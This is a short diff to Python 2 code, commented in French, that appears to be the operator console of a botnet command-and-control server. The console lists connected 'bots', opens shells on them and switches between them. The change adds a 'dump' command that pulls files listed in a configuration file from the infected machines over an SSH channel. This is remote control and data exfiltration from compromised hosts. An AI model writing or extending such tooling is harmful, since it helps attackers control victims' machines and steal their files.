@@ -83,6 +83,7 @@ class Myserver():
                         print "help : pour avoir l'aide\n"
                         print "list : pour avoir la liste des bots connecter\n"
                         print "switch : pour avoir un shell vers un autre bot de la liste, il faut entrer une ip parmi la liste des bots disponibles\n"
+                        print "dump : Faire un dump des fichiers définit dans le fichier de configuration 'path.cnf'\n"
                         print "deconnect : pour déconnecter le bot courant\n\n"
                     elif command == 'switch':
                         IP = raw_input("Enter l'IP d'un bot parmi la liste : ")
@@ -106,6 +107,8 @@ class Myserver():
                         else:
                             print "la liste des bots connectés est vide, on se met en attente...\n"
                     else:
+                        if command == 'dump':
+                            print '[*] Starting Dumping files\n'
                         ChannelSSH.sendToChannel(command,self.chan)
                         print ChannelSSH.receiveFromChannel(self.chan)
             except Exception, e:
